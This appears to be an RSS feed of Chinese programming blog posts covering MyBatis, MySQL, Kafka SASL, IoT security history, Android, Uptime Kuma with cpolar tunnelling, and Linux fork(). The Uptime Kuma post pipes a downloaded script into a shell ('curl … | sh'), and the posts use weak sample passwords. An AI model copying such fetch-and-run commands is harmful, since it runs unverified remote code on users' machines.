public class TestMyBatisAnno {@Autowiredprivate LocationsMapper locationsMapper;@Testpublic void testGetLocationsAll() {List&lt;Locations&gt; locationsAll = locationsMapper.getLocationsAll();for (Locations locations : locationsAll) {System.out.println(locations);}}@Testpublic void testAddLocations() {int rows = locationsMapper.addLocations();System.out.println(rows &gt; 0 ? "新增成功!" : "新增失败!!");}@Testpublic void testUpdateLocations() {int rows = locationsMapper.updateLocations();System.out.println(rows &gt; 0 ? "修改成功!" : "修改失败!!");}@Testpublic void testDeleteLocations() {int rows = locationsMapper.deleteLocations();System.out.println(rows &gt; 0 ? "删除成功!" : "删除失败!!");}
}
5.4 @MapperScan的使用
由于Mapper接口是需要使用@Mapper注解的,但是随着后续的开发,可能这样的Mapper接口会变得很多,那么可能每个接口都要加@Mapper注解,就会变得很麻烦,所以可以在SpringBoot的主启动类上添加@MapperScan注解,并指定要扫描的mapper包,这样的话,就会自动去获取指定包下的接口了
①**
MyBatisDemoApplication
**
//指定mapper接口所在包,当主启动类执行时,会自动扫描指定包下的接口
@MapperScan(value = "cn.tedu.mapper")
@SpringBootApplication
public class MyBatisDemoApplication {public static void main(String[] args) {SpringApplication.run(MyBatisDemoApplication.class, args);}}
6 MyBatis基于XML文件
6.1 编写实体类
由于此处我们的入门案例是查询jobs表,所以将Jobs类复制到项目中
6.2 定义接口和方法
MyBatis需要准备一个接口类,作为Mapper,该接口中的每一个方法可以绑定一条SQL,实现调用接口方法即可调用SQL的功能
①**
JobsMapper
**
package cn.tedu.mapper;import cn.tedu.pojo.Jobs;
import java.util.List;public interface JobsMapper {public List&lt;Jobs&gt; getJobsAll();
}
6.3 定义SQL文件
MyBatis基于XML文件的方式,是通过让SQL文件和指定的接口绑定,然后SQL语句统一书写在XML文件中
一般情况下,MyBatis的mapper.xml和mapper接口会同名,原因是为了方便开发人员进行代码的管理和维护。
①
JobsMapper.xml文件
&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
&lt;!DOCTYPE mapperPUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;
&lt;mapper namespace="cn.tedu.mapper.JobsMapper"&gt;&lt;/mapper&gt;
6.4 定义SQL
在SQL文件中,可以书写任意的SQL,只不过需要写在对应的标签中,并且id还要和对应的接口名相同
在SQL文件中通过
select
标签定义查询表所有记录的SQL语句
id的值必须要和绑定的接口中的方法名相同
resultType
则表示查询的结果封装到那个实体类中,也就是返回值的类型,如果返回的是集合,则定义集合中元素的类型
在SQL文件中通过
insert
,
update
,
delete
标签定义增删改表中记录的SQL语句
①
JobsMapper.xml文件
&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
&lt;!DOCTYPE mapperPUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;
&lt;mapper namespace="cn.tedu.mapper.JobsMapper"&gt;&lt;select id="getJobsAll" resultType="cn.tedu.pojo.Jobs"&gt;SELECT * FROM jobs&lt;/select&gt;
&lt;/mapper&gt;
6.5 指定MyBatis中mapper文件扫描路径
MyBatis在使用XML方式开发时,必须要在配置文件中指定mapper文件所在路径,否则会找不到资源
mybatis:mapper-locations: classpath: mapper文件所在路径
①**
application.yml
**
#设置连接数据库的url、username、password，这三部分不能省略
spring:datasource:url: jdbc:mysql://localhost:3306/hr?serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8username: rootpassword: root
#开启驼峰规则
mybatis:configuration:map-underscore-to-camel-case: true#指定mapper文件路径mapper-locations: classpath:mapper/*.xml
6.6 测试查询
①**
TestMyBatisXml
**
/*** 用于测试基于MyBatis注解开发的入门案例*/
@SpringBootTest
public class TestMyBatisXml {@Autowiredprivate JobsMapper jobsMapper;@Testpublic void testGetJobsAll() {List&lt;Jobs&gt; all = jobsMapper.getJobsAll();for (Jobs jobs : all) {System.out.println(jobs);}}
}
6.7 测试增删改操作
①**
JobsMapper接口
**
public interface JobsMapper {public List&lt;Jobs&gt; getJobsAll();public int insertJobs();public int updateJobs();public int deleteJobs();
}
②**
JobsMapper.xml
**
&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
&lt;!DOCTYPE mapperPUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;
&lt;mapper namespace="cn.tedu.mapper.JobsMapper"&gt;&lt;select id="getJobsAll" resultType="cn.tedu.pojo.Jobs"&gt;SELECT job_id, job_title, min_salary, max_salary FROM jobs&lt;/select&gt;&lt;insert id="insertJobs"&gt;INSERT INTO jobs VALUE ('6666', 'TEST', 10000, 30000)&lt;/insert&gt;&lt;update id="updateJobs"&gt;UPDATE jobs SET job_title='TEST666' WHERE job_id = '6666'&lt;/update&gt;&lt;delete id="deleteJobs"&gt;DELETE FROM jobs WHERE job_id = '6666'&lt;/delete&gt;
&lt;/mapper&gt;
③**
TestMyBatisXml
**
/*** 用于测试基于MyBatis注解开发的入门案例*/
@SpringBootTest
public class TestMyBatisXml {@Autowiredprivate JobsMapper jobsMapper;@Testpublic void testGetJobsAll() {List&lt;Jobs&gt; all = jobsMapper.getJobsAll();for (Jobs jobs : all) {System.out.println(jobs);}}@Testpublic void testInsert() {int rows = jobsMapper.insertJobs();System.out.println(rows &gt; 0 ? "新增成功!" : "新增失败!!");}@Testpublic void testUpdate() {int rows = jobsMapper.updateJobs();System.out.println(rows &gt; 0 ? "修改成功!" : "修改失败!!");}@Testpublic void testDelete() {int rows = jobsMapper.deleteJobs();System.out.println(rows &gt; 0 ? "删除成功!" : "删除失败!!");}
}
上一篇文章：
SpringBoot整合JDBCTemplate（day34）-CSDN博客
https://blog.csdn.net/Z0412_J0103/article/details/142098654
下一篇文章：
MyBatis的占位符（day36）-CSDN博客
https://blog.csdn.net/Z0412_J0103/article/details/142969916</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540169.html</guid><pubDate>Fri, 31 Oct 2025 07:26:54 +0000</pubDate></item><item><title>MySQL中表的操作</title><link>https://www.ppmy.cn/news/1540170.html</link><description>目录
一、查看所有表
1.1、语法
二、创建表
2.1、语法
2.2、示例：
2.3、创建数据加时使⽤校验语句[if not exists]
三、查看表结构
3.1、语法
3.2、示例
四、删除表
4.1、语法
4.2、示例
4.3、注意事项
五、主要数据类型
5.1、数值类型
5.2、日期和时间类型
5.3、字符串类型
5.3.1、char 和 varchar 的区别
5.3.2、如何选择char和varchar
一、查看所有表
1.1、语法
1 show tables;
注意：创建表时，需要先选择要操作的数据库
如下图：我们选择aokey数据库，使用SQL语句查看表结构，显示为空，因为我们暂未在该数据库中创建表。，下面我们先学习怎么创建表：
二、创建表
2.1、语法
create table aokey_table(id bigint,name varchar(20)
);
详细的建表语法参考相关网站：
https://dev.mysql.com/doc/refman/8.0/en/create-table.html
2.2、示例：
此时，我们再来查看表，如下图显示，即表示创建成功：
2.3、创建数据加时使⽤校验语句[if not exists]
如果该1数据库中表已存在，则会报出一个警告 ：
表
`aokey_table`
已存在
三、查看表结构
3.1、语法
1 desc 表名;
3.2、示例
解析：
（1）
Field
：
表中的字段
（2）
Type
：
字段的数据类型
（3）
Null
：
当前的字段是否允许为 Null
（4）
Key
：
键值的类型
（5）
Default
：
当前列的默认值，不指定时为 NULL
（6）
Extra
：
其他扩展内容（后期展示）
四、删除表
4.1、语法
1 DROP [TEMPORARY] TABLE [IF EXISTS] tbl_name [, tbl_name] ...
TEMPORARY
：表示临时表
tbl_name
：要删除的表名
[, tbl_name] ...
：一个drop可以删除很多表，中间用逗号隔开
4.2、示例
mysql&gt; drop table aokey_table;
Query OK, 0 rows affected (0.01 sec)mysql&gt; show tables;
Empty set (0.00 sec)
删除后，aokey 数据库为空
4.3、注意事项
•  删除表是⼀个危险操作，执行删除语句时⼀定要谨慎
•  删除表成功后，磁盘上对应的数据文件也会被删除
•  ⼀次可以删除多个表，表与表之间用逗号隔开
五、主要数据类型
5.1、数值类型
5.2、日期和时间类型
5.3、字符串类型
5.3.1、char 和 varchar 的区别
存储方式：
char
固定长度，
varchar
可变长度。
char
类型会占用固定长度的存储空间，例如如果定义了一个
char
(
10
) 类型的列，无论实际存储的数据长度是多少，都会占用10个字符的存储空间。而
varchar
类型则根据实际存储的数据长度来占用存储空间，例如如果定义了一个
varchar(10)
类型的列，存储一个5个字符长的字符串，则只会占用5个字符的存储空间。
存储效率：
char
类型在存储和检索时效率更高。由于
char
类型是固定长度的，所以在存储和读取数据时更快。而
varchar
类型由于可变长度，存储和读取时可能需要更多的操作。所以在需要频繁读写数据的场景下，
char
类型更适合。
存储空间：在存储相同数据的情况下，
char
类型占用的存储空间通常会比
varchar
类型大。由于
char
类型是固定长度的，所以无论存储的数据长度是多少，都会占用固定长度的存储空间。而
varchar
类型会根据实际存储的数据长度来占用存储空间，所以通常情况下占用的存储空间会比
char
类型少。
5.3.2、如何选择char和varchar
•    如果数据确定长度都一样，就使用定长
char
类型，比如：身份证，md5，学号，邮编。
•    如果数据
ch
度有变化,就使用变长
varchar
, 比如：名字，地址，但要规划好长度，保证最长的字符串能存的进去。
•    定长
char
类型比较浪费磁盘空间，但是效率⾼。
•    变长
varchar
类型比较节省磁盘空间，但是效率低。
•    定长
char
类型会直接开辟好对应的存储空间。
•    变长
varchar
类型在不超过定义长度范围的情况下用多少开辟多少存储空间 。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540170.html</guid><pubDate>Fri, 31 Oct 2025 07:26:56 +0000</pubDate></item><item><title>3 机器学习之假设空间</title><link>https://www.ppmy.cn/news/1540171.html</link><description>归纳(induction)与演绎(deduction)是科学推理的两大基本手段。前者是从特殊到一般的“泛化”(generalization)过程，即从具体的事实归结出一般性规律；后者则是从一般到特殊的“特化”(specialization)过程，即从基础原理推演出具体状况。例如，在数学公理系统中，基于一组公理和推理规则推导出与之相洽的定理，这是演绎；而“从样例中学习”显然是一个归纳的过程，因此亦称“归纳学习”(inductivelearning)。
归纳学习有狭义与广义之分，广义的归纳学习大体相当于从样例中学习，而狭义的归纳学习则要求从训练数据中学得概念(concept)，因此亦称为“概念学习”或“概念形成”​。概念学习技术目前研究、应用都比较少，因为要学得泛化性能好且语义明确的概念实在太困难了，现实常用的技术大多是产生“黑箱”模型。然而，对概念学习有所了解，有助于理解机器学习的一些基础思想。
概念学习中最基本的是布尔概念学习，即对“是”​“不是”这样的可表示为0/1布尔值的目标概念的学习。举一个简单的例子，假定我们获得了这样一个训练数据集：
表1.1　西瓜数据集
更一般的情况是考虑形如(A∧B)∨(C∧D)的析合范式。
这里要学习的目标是“好瓜”​。暂且假设“好瓜”可由“色泽”​“根蒂”​“敲声”这三个因素完全确定，换言之，只要某个瓜的这三个属性取值明确了，我们就能判断出它是不是好瓜。于是，我们学得的将是“好瓜是某种色泽、某种根蒂、某种敲声的瓜”这样的概念，用布尔表达式写出来则是“好瓜。​（色泽=？​）∧（根蒂=？​）∧（敲声=？​）​”​，这里“​？​”表示尚未确定的取值，而我们的任务就是通过对表1.1的训练集进行学习，把“​？​”确定下来。
“记住”训练样本，就能力。如果仅仅把训练集中的瓜“记住”​，是所谓的“机械学习”​[Cohen and Feigenbaum,1983]​，或称“死记硬背式学习”​，参见（1.5 发展历程）​。
读者可能马上发现，表1.1第一行：​“​（色泽=青绿）∧（根蒂=蜷缩）∧（敲声=浊响）​”不就是好瓜吗？是的，但这是一个已见过的瓜，别忘了我们学习的目的是“泛化”​，即通过对训练集中瓜的学习以获得对没见过的瓜进行判断的能力。如果仅仅把训练集中的瓜“记住”​，今后再见到一模一样的瓜当然可判断，但是，对没见过的瓜，例如“​（色泽=浅白）∧（根蒂=蜷缩）∧（敲声=浊响）​”怎么办呢？
这里我们假定训练样本不含噪声，并且不考虑“非青绿”这样的操作。由于训练集包含正例，因此假设自然不出现。
我们可以把学习过程看作一个在所有假设(hypothesis)组成的空间中进行搜索的过程，搜索目标是找到与训练集“匹配”(fit)的假设，即能够将训练集中的瓜判断正确的假设。假设的表示一旦确定，假设空间及其规模大小就确定了。这里我们的假设空间由形如“​（色泽=？​）∧（根蒂=？​）∧（敲声=？​）​”的可能取值所形成的假设组成。例如色泽有“青绿”​“乌黑”​“浅白”这三种可能取值；还需考虑到，也许“色泽”无论取什么值都合适，我们用通配符“
”来表示，例如“好瓜。​（色泽=
）∧（根蒂=蜷缩）∧（敲声=浊响）​”​，即“好瓜是根蒂蜷缩、敲声浊响的瓜，什么色泽都行”​。此外，还需考虑极端情况：有可能“好瓜”这个概念根本就不成立，世界上没有“好瓜”这种东西；我们用表示这个假设。这样，若“色泽”​“根蒂”​“敲声”分别有3、3、3种可能取值，则我们面临的假设空间规模大小为4×4×4+1=65。图1.1直观地显示出了这个西瓜问题假设空间。
图1.1　西瓜问题的假设空间
有许多可能的选择，如在路径上自顶向下与自底向上同时进行，在操作上只删除与正例不一致的假设等。
可以有许多策略对这个假设空间进行搜索，例如自顶向下、从一般到特殊，或是自底向上、从特殊到一般，搜索过程中可以不断删除与正例不一致的假设、和（或）与反例一致的假设。最终将会获得与训练集一致（即对所有训练样本能够进行正确判断）的假设，这就是我们学得的结果。
需注意的是，现实问题中我们常面临很大的假设空间，但学习过程是基于有限样本训练集进行的，因此，可能有多个假设与训练集一致，即存在着一个与训练集一致的“假设集合”​，我们称之为“版本空间”(version space)。例如，在西瓜问题中，与表1.1训练集所对应的版本空间如图1.2所示。
图1.2　西瓜问题的版本空</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540171.html</guid><pubDate>Fri, 31 Oct 2025 07:26:58 +0000</pubDate></item><item><title>Offset Explorer 连接kafka使用SASL 进行身份验证详解</title><link>https://www.ppmy.cn/news/1540172.html</link><description>使用 Offset Explorer（也称为 Kafka Tool）3.0.1 连接到 Kafka 并通过 SASL 进行身份验证，可以按照以下步骤进行配置：
1. 确保 Kafka 配置支持 SASL
首先，确保你的 Kafka 集群已配置为支持 SASL。你需要在
server.properties
文件中添加或修改以下配置：
# 启用 SASL 认证
listeners=SASL_PLAINTEXT://your-kafka-broker:9092
advertised.listeners=SASL_PLAINTEXT://your-kafka-broker:9092
sasl.enabled.mechanisms=PLAIN
sasl.mechanism.inter.broker.protocol=PLAIN
2. 配置 JAAS 文件
创建一个 JAAS 配置文件（例如
kafka_server_jaas.conf
），并定义你的用户和密码：
KafkaServer {org.apache.kafka.common.security.plain.PlainLoginModule requiredusername="your_username"password="your_password"user_your_username="your_password";
};
然后，在
server.properties
中指定 JAAS 文件的路径：
sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \username="your_username" \password="your_password";
3. 在 Offset Explorer 中配置 SASL 连接
打开 Offset Explorer
并创建一个新的 Kafka 集群连接。
在“security”设置中，选择“连接类型”
为
SASL_PLAINTEXT
或
SASL_SSL
（根据你的配置）。
输入 Kafka 集群的主机名和端口
，例如
your-kafka-broker:9092
。
在“Adanvce”中配置 :SASL Mechanism
: 选择
PLAIN
。
配置JAAS config
org.apache.kafka.server.auth.DigestLoginModule required username="admin" password="123456";
Username
: 输入你在 JAAS 配置中定义的用户名。
Password
: 输入相应的密码。
4. 测试连接
在 Offset Explorer 中完成以上设置后，点击“测试连接”按钮，确保一切设置正确。如果连接成功，你将能够浏览 Kafka 主题和消费消息。
5. 常见问题
连接失败
: 确保 Kafka 服务正在运行，并且你使用的 IP 地址和端口是正确的。
权限问题
: 确保所用用户有权访问相关主题。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540172.html</guid><pubDate>Fri, 31 Oct 2025 07:27:01 +0000</pubDate></item><item><title>下一代安全：融合网络和物理策略以实现最佳保护</title><link>https://www.ppmy.cn/news/1540173.html</link><description>在当今快速发展的技术环境中，网络和物理安全融合变得比以往任何时候都更加重要。随着物联网 (IoT) 和工业物联网 (IIoT) 的兴起，组织在保护数字和物理资产方面面临着独特的挑战。
本文探讨了安全融合的概念、说明其重要性的实际事件以及整合网络和物理安全措施的最佳实践。
了解网络和物理安全的融合
网络与物理安全融合是指将传统的物理安全措施与现代网络安全协议相结合。这种整体方法可确保解决所有潜在的切入点和漏洞，从而提供针对各种威胁的全面保护。
物联网和工业物联网的兴起
IoT（物联网）是指通过互联网进行通信和交换数据的庞大互联设备网络。这些设备包括智能家电、安全摄像头，甚至智能冰箱。另一方面，IIoT（工业物联网）涉及物联网的工业应用，例如智能制造系统和工业控制系统。
虽然物联网和工业物联网技术在效率和便利性方面都具有显著优势，但它们也带来了新的漏洞。许多物联网设备的设计安全功能很少，因此成为网络犯罪分子的诱人目标。如果这些设备的设计和部署缺乏严格的安全措施，可能会导致严重后果。
现实世界事件凸显融合的必要性
以下三起值得注意的事件凸显了融合的必要性：
1. Mirai 僵尸网络攻击
2016 年的 Mirai 僵尸网络攻击利用物联网设备中的漏洞发起大规模分布式拒绝服务 (DDoS) 攻击，破坏了 Twitter、Netflix 和 Reddit 等主要网站。Mirai 通过在互联网上扫描具有默认密码的易受攻击的物联网设备来传播。它使用 62 个常用默认用户名和密码列表来访问这些设备。一旦被感染，这些设备就会成为 Mirai 僵尸网络的一部分，可以远程控制它以发起 DDoS 攻击。这一事件强调了物联网设备中强大的安全措施（包括严格的密码策略）的迫切需要以及定期固件更新的重要性。
2. 赌场鱼缸黑客攻击
2018 年，北美一家赌场遭遇入侵，黑客利用了基于物联网的鱼缸监控系统的漏洞。鱼缸的传感器连接到一台电脑上，用于调节鱼缸的温度、食物和清洁度。黑客利用温度计的漏洞进入赌场网络。进入网络后，攻击者横向移动以访问赌场的高价值数据库。此案例清楚地说明了将不安全的物联网设备集成到关键网络基础设施中的风险，并强调了网络分段和严格访问控制的重要性。
许多物联网设备的设计都只具备最低限度的安全功能，因此很容易成为网络犯罪分子的目标。如果这些设备的设计和部署缺乏严格的安全措施，则可能导致严重后果。
3. WannaCry 勒索软件攻击
2017 年的 WannaCry 勒索软件攻击影响了全球众多组织，包括医院和教育机构。勒索软件利用 Windows 操作系统中未修补的漏洞，加密数据并索要赎金。这次攻击表明忽视软件更新的破坏性影响，并强调需要采取主动的网络安全措施来防范勒索软件威胁。
整合网络和物理安全的最佳实践
采取以下政策对于减轻网络安全攻击对企业和关键基础设施造成的破坏性影响至关重要。
■ 全面风险评估：
组织应进行全面的风险评估，以识别其物理和数字基础设施中的潜在漏洞。这涉及评估物联网设备、网络配置和物理安全措施，以保护所有潜在入口点。典型示例包括确保使用加密、安全协议、密码管理等。
■ 定期更新固件和软件：
保持固件和软件更新对于防范已知漏洞至关重要。制造商和集成商应确保物联网设备和其他连接系统及时更新，以降低安全风险。
■ 网络分段：
对网络进行分段，将关键系统与安全性较低的设备隔离开来，可以防止攻击者的横向移动。这涉及为物联网设备、敏感数据和操作系统创建单独的网络区域，每个区域都有自己的安全协议。
■ 强大的访问控制：
实施强大的访问控制，例如多因素身份验证和基于角色的访问，可以显著增强安全性。零信任是新兴的标准，默认情况下不信任任何人。这确保只有授权人员才能访问敏感系统和数据。
■ 员工培训和意识：
定期培训计划可以让员工掌握识别和应对安全威胁的知识。这包括了解网络安全最佳实践的重要性、识别网络钓鱼企图以及知道如何报告可疑活动。
■ 高级监控和监视：
利用具有人工智能分析功能的高级监控系统可以增强物理和网络安全。这些系统可以检测异常行为、检测场景中的异常、识别面部并实时识别潜在威胁，从而提供主动的安全方法。
■ 与值得信赖的供应商合作：
与信誉良好的供应商合作至关重要，这些供应商优先考虑产品和服务的安全性。组织应审查供应商的安全实践，并确保他们遵守行业标准和最佳实践。对于安全摄像头等设备，确保供应商遵守 NIST（美国国家标准与技术研究所）的 FIPS 140-2 Level 3 等严格标准，以保护设备免受攻击。
网络和物理安全的融合不仅是一种趋势，而且是现代威胁形势下的必然选择。随着物理资产和数字资产之间的界限越来越模糊，统一的安全方法可以提供针对各种威胁的强大保护。
通过采用最佳实践并利用先进技术，组织可以保护其资产、保护其数据并确保其员工和客户的安全。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540173.html</guid><pubDate>Fri, 31 Oct 2025 07:27:03 +0000</pubDate></item><item><title>Android 关于引用unityLibrary依赖库无法加载so库问题或脚本报错问题</title><link>https://www.ppmy.cn/news/1540174.html</link><description>Unity编辑器导出 Android 项目结构 会生成unityLibrary依赖库，复制到其他项目使用时发现脚本一直在报错，结果发现是so没有引用到的问题
1.在 app 目录下的AndroidManifest.xml文件 application节点添加
&lt;application android:extractNativeLibs="true"&gt;
&lt;/application&gt;
2.在 app 目录下的 build.gradle 文件下添加
android {packagingOptions {jniLibs {useLegacyPackaging true}}
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540174.html</guid><pubDate>Fri, 31 Oct 2025 07:27:06 +0000</pubDate></item><item><title>Docker部署一款小巧又强大的的自托管网站监控工具Uptime Kuma</title><link>https://www.ppmy.cn/news/1540175.html</link><description>文章目录
前言
1.关于Uptime Kuma
2.安装Docker
3.本地部署Uptime Kuma
4.使用Uptime Kuma
5.cpolar内网穿透工具安装
6.创建远程连接公网地址
7.固定Uptime Kuma公网地址
💡
推荐
前些天发现了一个巨牛的人工智能学习网站，通俗易懂，风趣幽默，忍不住分享一下给大家。【点击跳转到网站】
前言
本篇文章介绍如何在本地部署Uptime Kuma，并结合cpolar内网穿透实现公网远程访问。
说起网站相信大家都已经非常熟悉了，很多人手里都会有多个网站，那么在管理自己网站的时候，往往就需要一个不错的监控工具。
今天给大家分享的开源项目，能直观的图形用户界面实时反馈服务器的可用性、性能和健康状况，是你运维管理的好帮手，它就是Github上拥有庞大的贡献者而且拥有57k star的Uptime Kuma！
1.关于Uptime Kuma
Uptime Kuma可以添加的监控项包括HTTP(s)、TCP、HTTP(s)关键词、HTTP(s) JSON查询、Ping、DNS记录、推送、Docker容器运行时间、Steam游戏服务等常见网站运行参数。当服务器发生意外情况时，Uptime Kuma支持用户选择70多种通知服务，例如Telegram、Discord、Gotify、Slack、Pushover、电子邮件等，以便及时接收网站服务故障通知，帮助用户减少经济损失。
Uptime Kuma具有灵活高效的用户交互界面，用户可以根据需要隐藏或显示监控状态，并且可以使用网页标签功能对不同功能的网站进行分类，以便在特定时段关注高风险站点。此外，Uptime Kuma还提供多种语言支持，官方就提供了中文语言包。
Github地址：
GitHub - louislam/uptime-kuma: A fancy self-hosted monitoring tool
以下是Uptime Kuma支持的功能特性：
监控类型
：支持监控 HTTP(s) / TCP / HTTP(s) 关键字 / HTTP(s) Json 查询 / Ping / DNS 记录 / Push / Steam 游戏服务器 / Docker 容器 / 数据库（SQL Server、PostgreSQL、MySQL、MongoDB、Redis 等）
通知类型
：支持 Telegram / Discord / Gotify / Slack / Pushover / Email / Webhook 等 90 多种通知方式
检测间隔
：支持最低 20 秒的检测间隔
图表
：支持以图表形式查看历史数据
2.安装Docker
本教程操作环境为Linux Ubuntu系统，在开始之前，我们需要先安装Docker。
在终端中执行下方命令安装docker：
curl
-fsSL https://get.docker.com -o get-docker.sh
然后再启动docker
sudo
sh
get-docker.sh
最后我们在docker容器中运行下
hello world
看一下是否安装成功。
sudo
docker container run hello-world
可以看到出现了hello world，说明我们已经安装docker成功，就可以进行下一步了
3.本地部署Uptime Kuma
本项目提供了一键安装脚本：
sudo
docker run -d --restart
=
always -p
3001
:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1
一条命令实现，本项目使用的是3001端口，需要在防火墙放开。
现在就已经安装成功啦！您可以通过打开Web浏览器输入localhost:3001来登录或注册您的Uptime Kuma啦！
注意
如果你想限制对 localhost 的公开（不为其他用户公开端口或使用反向代理），你可以像这样公开端口：
sudo
docker run -d --restart
=
always -p
127.0
.0.1:3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1
4.使用Uptime Kuma
注册登录后进入到仪表盘，可以直接点击左上角的”添加监控项“
根据自己的需求选择监控类型，这里以监控cpolar为例，在URL中填写上cpolar的地址后保存
稍等片刻就能看到监控的数据以及图标
小结
上面在本地Linux中使用Docker成功部署了Uptime Kuma，并局域网访问成功。整体来说Uptime Kuma是一款非常不错的网站监控工具，它提供了完备的功能，并且具有非常好的实用性和易用性，并且也非常容易安装部署。
如果想在公网远程管理Uptime Kuma，就可以创建一个公网地址，这里我使用的是cpolar内网穿透，通过cpolar转发本地端口映射的http公网地址，我们可以很容易实现远程访问，而无需自己注册域名购买云服务器，可节省大量的资金。
5.cpolar内网穿透工具安装
下面是安装cpolar步骤：
Cpolar官网地址: https://www.cpolar.com
使用一键脚本安装命令
sudo
curl
https://get.cpolar.sh
|
sh
安装完成后，执行下方命令查看cpolar服务状态：（如图所示即为正常启动）
sudo
systemctl status cpolar
Cpolar安装和成功启动服务后，在浏览器上输入ubuntu主机IP加9200端口即:【http://localhost:9200】访问Cpolar管理界面，使用Cpolar官网注册的账号登录,登录后即可看到cpolar web 配置界面,接下来在web 界面配置即可：
6.创建远程连接公网地址
登录cpolar web UI管理界面后,点击左侧仪表盘的隧道管理——创建隧道：
隧道名称：可自定义，本例使用了: Uptimekuma注意不要与已有的隧道名称重复
协议：http
本地地址：https://localhost:3001
域名类型：随机域名
地区：选择China Top
创建成功后,打开左侧在线隧道列表,可以看到刚刚通过创建隧道生成了两个公网地址，接下来就可以在其他电脑（异地）上，使用任意一个地址在浏览器中访问即可。
如下图所示，成功实现使用公网地址异地远程访问本地部署的Uptime Kuma
使用上面的cpolar https公网地址，在任意设备的浏览器进行访问，即可成功看到我们Uptime Kuma管理界面，这样一个利用公网地址可以进行远程访问的隧道就创建好了，隧道使用了cpolar的公网域名，无需自己购买云服务器，可节省大量资金。使用cpolar创建隧道即可发布到公网进行远程访问，新域名登录，可能需要重新登陆!
7.固定Uptime Kuma公网地址
由于以上使用cpolar所创建的隧道使用的是随机公网地址，24小时内会随机变化，不利于长期远程访问。因此我们可以为其配置二级子域名，该地址为固定地址，不会随机变化。
注意需要将cpolar套餐升级至基础套餐或以上，且每个套餐对应的带宽不一样。【cpolar.cn已备案】
登录cpolar官网：https://www.cpolar.com
点击左侧的预留，选择保留二级子域名，地区选择china top，然后设置一个二级子域名名称，填写备注信息，点击保留。
保留成功后复制保留的二级子域名地址：
登录cpolar web UI管理界面，点击左侧仪表盘的隧道管理——隧道列表，找到所要配置的隧道，点击右侧的
编辑
。
修改隧道信息，将保留成功的二级子域名配置到隧道中
域名类型：选择二级子域名
Sub Domain：填写保留成功的二级子域名
地区: China Top
点击
更新
更新完成后，打开在线隧道列表，此时可以看到随机的公网地址已经发生变化，地址名称也变成了保留和固定的二级子域名名称。
最后，我们使用固定的公网地址访问Uptime Kuma管理界面可以看到访问成功，一个永久不会变化的远程访问方式即设置好了。
接下来就可以随时随地进行公网访问管理Uptime Kuma了，把公网地址分享给身边的人，还可以方便团队协作。自己用的话，无需云服务器，还可以实现异地远程访问！以上就是如何在Linux Ubuntu系统Docker本地安装Uotime Kuma的全部过程。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540175.html</guid><pubDate>Fri, 31 Oct 2025 07:27:08 +0000</pubDate></item><item><title>【Linux】进程详解：进程的创建终止等待替换</title><link>https://www.ppmy.cn/news/1540176.html</link><description>✨
当时只道是寻常
🌏
📃个人主页：island1314
🔥个人专栏：Linux—登神长阶
⛺️
欢迎关注：👍点赞 👂🏽留言 😍收藏  💞 💞 💞
1. 前言
🚀
🌈之前在这两篇文章中
【Linux】进程管理：状态与优先级调度的深度分析
【Linux】进程详解：命令行参数、环境变量及地址空间-CSDN博客
我们已经了解过了进程的基本概念，这一章我们要进一步的学习进程，即 **
「进程的创建和终止」
**。
2. 进程创建
🖊
2.1 fork()函数的深入了解
之前博客里面我们讲过了，现在只是来做个温习
创建进程有两种创建方式：
使用
./
运行某一个可执行程序，这种是最常见的方式
使用系统调用接口创建进程，即使用
fork()
，
fork()
函数可以帮助我们从原来的进程中创建一个新的子进程，而原来的进程就被叫做
父进程
。
2.1.1 利用fork()创建进程
#include &lt;unistd.h&gt;
pid_t fork(); // 返回值有两个：子进程返回0，父进程返回子进程的PID，如果子进程创建失败返回-1
2.1.2 fork()在内核中做了啥？
进程调用fork，当控制转移到内核中的fork代码后，内核做：
分配新的内存块 和
task_struct、mm_struct
等内核数据结构给子进程
将父进程部分数据结构内容拷贝至子进程
添加子进程到系统进程列表当中
fork()
返回相应的返回值，
开始调度器调度
当一个进程调用fork之后，就有两个二进制代码相同的进程。而且它们都运行到相同的地方。但每个进程都将可以开始它们自己的旅程
因此我们就可以知道
fork()
创建一个进程之所以会有两个返回值的原因
在
fork()
函数内部的执行的过程中，就已经创建了一个新的进程，所以新的进程会有一个返回值，而父进程也会有一个返回值
2.2.3 父子进程的关系
新创建的子进程机会和父进程一模一样，但是还是不完全一样
子进程得到与父进程在用户级别虚拟地址空间相同的一份拷贝，包括代码和数据段，堆，共享库以及用户栈。而他们之间最大的区别就在于两个进程的PID不同
父进程和子进程是并发执行的独立进程
父进程和子进程有相同但是独立的地址空间，后面会讲到其实父进程和子进程在虚拟地址层面上地址空间是一样的，但是它们都有自己独立的物理地址空间
子进程继承了父进程中所有的打开文件，所以父子进程共享所有的文件
2.2 fork 函数返回值
在之前的博客中就说过了
fork()
函数有两个返回值，子进程返回0，父进程返回子进程的PID，下面就需要解决三个问题。
fork()
为什么会出现两个返回值
❓
根据
fork()
函数在内核中的操作就包含了子进程的数据结构的创建，所以在
fork()
返回之前，子进程就已经被创建出来了。而一旦被创建出来一个独立的进程就会有返回值，所以调用这个
fork()
函数的父进程有一个返回值，而创建出的子进程也会有一个返回值
因为这两个过程是在
fork()
函数内部就已经完成了，因此我们在
fork()
函数外面看到的现象就是一个函数出现了两个返回值
.为什么子进程要返回0，而父进程要返回子进程的PID❓
一个父进程可以创建很多的子进程，而每一个子进程都只能有一个父进程
